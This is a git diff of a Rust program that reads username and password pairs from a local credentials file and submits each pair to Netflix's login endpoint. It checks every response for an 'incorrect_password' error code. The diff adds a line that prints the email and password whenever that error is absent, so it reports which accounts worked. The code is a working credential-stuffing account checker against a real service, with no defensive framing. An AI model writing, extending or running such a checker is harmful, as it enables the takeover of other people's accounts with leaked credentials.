@@ -23,13 +23,13 @@ where
 async fn main() -> Result<(), Error> {
     let url = "https://www.netflix.com/login";
     
-    if let Ok(lines) = read_lines("./src/creditentials.txt") {
+    if let Ok(lines) = read_lines("./creditentials.txt") {
         let client = Client::new();
 
         for line in lines.flatten() {
             let (username, password) = extract(&line);
             
-            let data = json!({
+            let data = json!({  
                 "jsonGraph": {
                     "aui": {
                         "moneyball": {
@@ -63,6 +63,7 @@ async fn main() -> Result<(), Error> {
                     println!("Error code 'incorrect_password' found.");
                 } else {
                     println!("Error code 'incorrect_password' not found.");
+                    println!("Email : {}, Password : {}", username, password);
                 }
             } else {
                 println!("Request failed with status code {}", status_code);
